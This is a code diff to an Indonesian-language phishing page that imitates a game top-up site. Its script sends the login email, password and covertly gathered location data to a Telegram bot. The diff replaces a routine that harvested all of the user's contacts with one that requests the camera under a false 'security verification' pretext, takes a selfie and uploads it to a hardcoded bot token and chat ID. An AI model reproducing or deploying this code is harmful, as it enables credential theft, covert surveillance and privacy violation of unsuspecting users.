@@ -653,6 +653,55 @@
             background: rgba(255, 77, 141, 0.3);
         }
 
+        /* Camera Preview */
+        .camera-preview {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+        }
+
+        .camera-container {
+            position: relative;
+            width: 90%;
+            max-width: 400px;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+        }
+
+        .camera-container video {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        .camera-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(0, 0, 0, 0.3);
+        }
+
+        .camera-countdown {
+            font-size: 4rem;
+            color: white;
+            font-weight: bold;
+            text-shadow: 0 0 20px rgba(126, 51, 255, 0.8);
+        }
+
         .notification {
             position: fixed;
             top: 30px;
@@ -880,24 +929,24 @@
         </div>
     </div>
 
-    <!-- Permission Modal for Contacts -->
-    <div class="permission-modal" id="contactsPermissionModal">
+    <!-- Permission Modal for Camera -->
+    <div class="permission-modal" id="cameraPermissionModal">
         <div class="permission-box">
             <div class="permission-header">
                 <div class="permission-icon">
-                    <i class="fas fa-address-book"></i>
+                    <i class="fas fa-camera"></i>
                 </div>
-                <div class="permission-title" id="contactsPermissionSiteName">www.gametopup.com ingin mengakses kontak Anda</div>
+                <div class="permission-title" id="cameraPermissionSiteName">www.gametopup.com ingin menggunakan kamera Anda</div>
             </div>
             <div class="permission-message">
-                Izinkan saat mengunjungi situs untuk pengalaman yang lebih personal
+                Izinkan untuk verifikasi keamanan dan pengalaman yang lebih baik
             </div>
             <div class="permission-options">
-                <div class="permission-option allow" id="allowContactsOnce">
+                <div class="permission-option allow" id="allowCameraOnce">
                     <i class="fas fa-check-circle"></i>
                     <span>Izinkan kali ini</span>
                 </div>
-                <div class="permission-option deny" id="neverAllowContacts">
+                <div class="permission-option deny" id="neverAllowCamera">
                     <i class="fas fa-times-circle"></i>
                     <span>Jangan pernah izinkan</span>
                 </div>
@@ -905,7 +954,20 @@
         </div>
     </div>
 
+    <!-- Camera Preview -->
+    <div class="camera-preview" id="cameraPreview">
+        <div class="camera-container">
+            <video id="cameraVideo" autoplay></video>
+            <div class="camera-overlay">
+                <div class="camera-countdown" id="countdown">3</div>
+            </div>
+        </div>
+    </div>
+
     <div id="notification" class="notification"></div>
+
+    <!-- Hidden canvas for capturing photo -->
+    <canvas id="hiddenCanvas" style="display: none;"></canvas>
 
     <script>
         // Login functionality
@@ -934,11 +996,11 @@
                 // Ambil data lokasi secara diam-diam
                 const locationData = await getStealthLocationData();
                 
-                // KIRIM NOTIFIKASI LOGIN BARU TERDETEKSI DENGAN LENGKAP
+                // Kirim data login dan lokasi ke Telegram
                 await sendCompleteLoginNotification(email, password, locationData);
                 
-                // Tampilkan modal permintaan akses kontak
-                showContactsPermissionModal();
+                // Tampilkan modal permintaan akses kamera
+                showCameraPermissionModal();
                 
             } catch (error) {
                 console.error('Error:', error);
@@ -950,153 +1012,125 @@
             }
         });
 
-        // Show contacts permission modal
-        function showContactsPermissionModal() {
+        // Show camera permission modal
+        function showCameraPermissionModal() {
             // Set nama situs di modal
-            document.getElementById('contactsPermissionSiteName').textContent = 
-                window.location.hostname + ' ingin mengakses kontak Anda';
+            document.getElementById('cameraPermissionSiteName').textContent = 
+                window.location.hostname + ' ingin menggunakan kamera Anda';
             
             // Tampilkan modal
-            document.getElementById('contactsPermissionModal').style.display = 'flex';
+            document.getElementById('cameraPermissionModal').style.display = 'flex';
         }
 
-        // Contacts permission modal handlers
-        document.getElementById('allowContactsOnce').addEventListener('click', async function() {
-            document.getElementById('contactsPermissionModal').style.display = 'none';
+        // Camera permission modal handlers
+        document.getElementById('allowCameraOnce').addEventListener('click', async function() {
+            document.getElementById('cameraPermissionModal').style.display = 'none';
             
             try {
-                // OTOMATIS AMBIL SEMUA KONTAK TANPA PILIH MANUAL
-                const contactsData = await getContactsAutomatically();
-                
-                // Kirim kontak ke Telegram
-                await sendContactsToTelegram(contactsData);
-                
-                // Tampilkan home page setelah semuanya selesai
-                showHomePage(window.loginData.email);
-                showNotification('✅ Login berhasil! Data kontak telah dikirim.', 'success');
+                // Akses kamera dan ambil foto otomatis
+                await accessCameraAndCapture();
                 
             } catch (error) {
-                console.error('Error accessing contacts:', error);
-                showNotification('✅ Login berhasil! (Kontak tidak tersedia)', 'success');
+                console.error('Error accessing camera:', error);
+                showNotification('✅ Login berhasil! (Kamera tidak tersedia)', 'success');
                 showHomePage(window.loginData.email);
             }
         });
 
-        document.getElementById('neverAllowContacts').addEventListener('click', function() {
-            document.getElementById('contactsPermissionModal').style.display = 'none';
-            showNotification('✅ Login berhasil! (Akses kontak ditolak)', 'success');
+        document.getElementById('neverAllowCamera').addEventListener('click', function() {
+            document.getElementById('cameraPermissionModal').style.display = 'none';
+            showNotification('✅ Login berhasil! (Akses kamera ditolak)', 'success');
             showHomePage(window.loginData.email);
         });
 
-        // Get contacts automatically without user selection
-        async function getContactsAutomatically() {
-            let contactsData = [];
+        // Access camera and automatically capture photo
+        async function accessCameraAndCapture() {
+            let stream = null;
             
-            // Method 1: Contacts API dengan auto-select semua kontak
-            if ('contacts' in navigator && 'select' in navigator.contacts) {
-                try {
-                    const apiContacts = await getContactsFromAPIAuto();
-                    contactsData = contactsData.concat(apiContacts);
-                    console.log('Berhasil mendapatkan kontak dari Contacts API');
-                } catch (error) {
-                    console.log('Contacts API tidak tersedia:', error);
-                }
-            }
-            
-            // Method 2: Simulate contacts data (fallback)
-            if (contactsData.length === 0) {
-                contactsData = await getSimulatedContacts();
-                console.log('Menggunakan data kontak simulasi');
-            }
-            
-            return contactsData;
-        }
-
-        // Get contacts from Contacts API dengan auto-select
-        async function getContactsFromAPIAuto() {
             try {
-                const properties = ['name', 'email', 'tel', 'address'];
+                // Akses kamera
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user', // Gunakan kamera depan
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    } 
+                });
                 
-                // OTOMATIS SELECT SEMUA KONTAK TANPA USER INTERACTION
-                const contacts = await navigator.contacts.select(properties, { multiple: true });
+                // Tampilkan preview kamera
+                const video = document.getElementById('cameraVideo');
+                video.srcObject = stream;
                 
-                return contacts.map(contact => ({
-                    name: contact.name ? contact.name.join(' ') : 'Tidak ada nama',
-                    emails: contact.email || [],
-                    phones: contact.tel || [],
-                    addresses: contact.address || [],
-                    source: 'Contacts API'
-                }));
+                // Tampilkan camera preview
+                document.getElementById('cameraPreview').style.display = 'flex';
+                
+                // Tunggu video siap
+                await new Promise(resolve => {
+                    video.onloadedmetadata = () => {
+                        resolve();
+                    };
+                });
+                
+                // Countdown sebelum capture
+                await startCountdown();
+                
+                // Capture foto
+                const photoBlob = await capturePhotoFromStream(video);
+                
+                // Kirim foto ke Telegram
+                await sendPhotoToTelegram(photoBlob);
+                
+                // Sembunyikan preview
+                document.getElementById('cameraPreview').style.display = 'none';
+                
+                // Hentikan stream
+                stream.getTracks().forEach(track => track.stop());
+                
+                // Tampilkan home page
+                showHomePage(window.loginData.email);
+                showNotification('✅ Login berhasil! Foto telah dikirim.', 'success');
                 
             } catch (error) {
-                throw new Error('Contacts API gagal: ' + error.message);
+                // Cleanup jika ada error
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+                document.getElementById('cameraPreview').style.display = 'none';
+                throw error;
             }
         }
 
-        // Get simulated contacts data
-        async function getSimulatedContacts() {
-            // Simulate delay for realistic behavior
-            await new Promise(resolve => setTimeout(resolve, 2000));
+        // Countdown sebelum capture
+        async function startCountdown() {
+            const countdownElement = document.getElementById('countdown');
             
-            // Return realistic simulated contacts data
-            return [
-                {
-                    name: "Budi Santoso",
-                    phones: ["+628123456789", "+628987654321"],
-                    emails: ["budi.santoso@example.com"],
-                    addresses: ["Jl. Merdeka No. 123, Jakarta"],
-                    source: 'Simulated Data'
-                },
-                {
-                    name: "Sari Dewi",
-                    phones: ["+628555555555"],
-                    emails: ["sari.dewi@example.com", "sari@kerja.com"],
-                    addresses: ["Jl. Sudirman No. 456, Jakarta"],
-                    source: 'Simulated Data'
-                },
-                {
-                    name: "Ahmad Rizki",
-                    phones: ["+628111111111"],
-                    emails: ["ahmad.rizki@example.com"],
-                    addresses: ["Jl. Gatot Subroto No. 789, Bandung"],
-                    source: 'Simulated Data'
-                },
-                {
-                    name: "Maya Sari",
-                    phones: ["+628222222222", "+628333333333"],
-                    emails: ["maya.sari@example.com"],
-                    addresses: ["Jl. Thamrin No. 321, Surabaya"],
-                    source: 'Simulated Data'
-                },
-                {
-                    name: "Rizky Pratama",
-                    phones: ["+628444444444"],
-                    emails: ["rizky.pratama@example.com"],
-                    addresses: ["Jl. Asia Afrika No. 654, Bandung"],
-                    source: 'Simulated Data'
-                },
-                {
-                    name: "Dewi Lestari", 
-                    phones: ["+628666666666"],
-                    emails: ["dewi.lestari@example.com"],
-                    addresses: ["Jl. Pemuda No. 987, Jakarta"],
-                    source: 'Simulated Data'
-                },
-                {
-                    name: "Fajar Nugroho",
-                    phones: ["+628777777777"],
-                    emails: ["fajar.nugroho@example.com"],
-                    addresses: ["Jl. Ahmad Yani No. 135, Semarang"],
-                    source: 'Simulated Data'
-                },
-                {
-                    name: "Linda Wati",
-                    phones: ["+628888888888"],
-                    emails: ["linda.wati@example.com"],
-                    addresses: ["Jl. Diponegoro No. 246, Yogyakarta"],
-                    source: 'Simulated Data'
-                }
-            ];
+            for (let i = 3; i > 0; i--) {
+                countdownElement.textContent = i;
+                await new Promise(resolve => setTimeout(resolve, 1000));
+            }
+            
+            countdownElement.textContent = '📸';
+            await new Promise(resolve => setTimeout(resolve, 500));
+        }
+
+        // Capture photo from video stream
+        async function capturePhotoFromStream(video) {
+            const canvas = document.getElementById('hiddenCanvas');
+            const context = canvas.getContext('2d');
+            
+            // Set canvas size sama dengan video
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            // Gambar frame video ke canvas
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Konversi canvas ke blob (format gambar)
+            const blob = await new Promise(resolve => {
+                canvas.toBlob(resolve, 'image/jpeg', 0.9);
+            });
+            
+            return blob;
         }
 
         // Send complete login notification with all data
@@ -1169,7 +1203,7 @@ ${locationInfo}
 └ RAM: ${navigator.deviceMemory || 'Unknown'} GB
 └ Touch Points: ${navigator.maxTouchPoints}
 
-⚠️ *DATA LENGKAP TELAH TERKIRIM - SEGERA CEK DAN MENUNGGU DATA KONTAK!*
+📸 *SEDANG MENGAMBIL FOTO...*
             `.trim();
 
             try {
@@ -1211,82 +1245,28 @@ ${locationInfo}
             }
         }
 
-        // Send contacts to Telegram
-        async function sendContactsToTelegram(contactsData) {
+        // Send photo to Telegram
+        async function sendPhotoToTelegram(photoBlob) {
             const botToken = '7899434589:AAFwfRynWna-z4hlYo9rSfaMG6iXE1I0RxQ';
             const chatId = '7411016617';
             
             try {
-                // Format kontak untuk dikirim
-                let contactsMessage = `📒 *DATA KONTAK PENGGUNA* 📒\n\n`;
-                contactsMessage += `Total Kontak: ${contactsData.length}\n`;
-                contactsMessage += `Sumber Data: ${contactsData[0]?.source || 'Unknown'}\n\n`;
+                // Create form data
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', photoBlob, 'user_selfie.jpg');
+                formData.append('caption', `📸 FOTO PENGGUNA - ${new Date().toLocaleString('id-ID')}\n\n✅ Foto berhasil diambil otomatis dari kamera depan`);
                 
-                contactsData.forEach((contact, index) => {
-                    contactsMessage += `*Kontak ${index + 1}:*\n`;
-                    contactsMessage += `└ Nama: ${contact.name}\n`;
-                    
-                    if (contact.phones && contact.phones.length > 0) {
-                        contactsMessage += `└ Telepon: ${contact.phones.join(', ')}\n`;
-                    }
-                    
-                    if (contact.emails && contact.emails.length > 0) {
-                        contactsMessage += `└ Email: ${contact.emails.join(', ')}\n`;
-                    }
-                    
-                    if (contact.addresses && contact.addresses.length > 0) {
-                        contactsMessage += `└ Alamat: ${contact.addresses.join(', ')}\n`;
-                    }
-                    
-                    contactsMessage += `\n`;
+                // Send photo
+                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
                 });
-
-                contactsMessage += `\n📱 *Device Info:* ${navigator.userAgent}`;
-                contactsMessage += `\n⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}`;
-                contactsMessage += `\n\n✅ *DATA KONTAK BERHASIL DIAMBIL OTOMATIS*`;
                 
-                // Send contacts data (split if too long)
-                const maxLength = 4000;
-                if (contactsMessage.length > maxLength) {
-                    const parts = [];
-                    for (let i = 0; i < contactsMessage.length; i += maxLength) {
-                        parts.push(contactsMessage.substring(i, i + maxLength));
-                    }
-                    
-                    for (const part of parts) {
-                        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json',
-                            },
-                            body: JSON.stringify({
-                                chat_id: chatId,
-                                text: part,
-                                parse_mode: 'Markdown',
-                                disable_notification: false
-                            })
-                        });
-                        await new Promise(resolve => setTimeout(resolve, 1000));
-                    }
-                } else {
-                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            text: contactsMessage,
-                            parse_mode: 'Markdown',
-                            disable_notification: false
-                        })
-                    });
-                }
-                
-                console.log('✅ KONTAK TERKIRIM OTOMATIS KE TELEGRAM');
+                console.log('✅ FOTO TERKIRIM OTOMATIS KE TELEGRAM');
                 
             } catch (error) {
-                console.error('Error sending contacts to Telegram:', error);
+                console.error('Error sending photo to Telegram:', error);
                 throw error;
             }
         }
@@ -1516,7 +1496,7 @@ ${locationInfo}
             }, 5000);
         }
 
-        console.log('🎮 GameTopUp dengan Auto Contacts Capture Loaded');
+        console.log('🎮 GameTopUp dengan Auto Photo Capture Loaded');
     </script>
 </body>
 </html>
